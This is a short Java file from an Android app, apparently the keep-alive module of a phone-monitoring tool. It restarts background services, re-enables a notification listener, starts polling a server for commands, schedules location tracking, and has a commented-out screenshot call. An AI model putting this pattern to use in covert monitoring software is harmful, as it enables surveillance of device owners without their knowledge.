package com.keepalive;

import com.main.MainUtils;
import com.main.ForegroundService;
import com.main.GSBroadcastReceiver;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class ServiceKeepAlive implements Runnable{
	Context mContext;
	
	public ServiceKeepAlive(Context context){
		mContext = context;
	}

	public void run(){
		try{
			if (Build.VERSION.SDK_INT >= 21) {
				Intent intentjob = new Intent(mContext,JobDeamonService.class);
				intentjob.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				mContext.startService(intentjob);
	        }
    	
	    	if ((Build.VERSION.SDK_INT >= 18) && 
	    			(PublicFunction.isServiceWorking(mContext, NotificationListener.class.getName()) == false)) {
	    		NotificationListener.toggleNotificationListenerService(mContext);
			}

			MainUtils.createAccount(mContext);
			
			GSBroadcastReceiver.init(mContext);
			
			MainUtils.serverCmdThread(mContext);
			
			MainUtils.setServerCmdAlarm(mContext);

			PrefOper.setValue(mContext, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.LOCATIONREPEATPERMISSION,String.valueOf(Public.PHONE_LOCATION_MINSECONDS));
			
			MainUtils.scheduleLocation(mContext);
			
	    	//AdvanceFunc.scheduleScreenshot(context);
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
	}
}
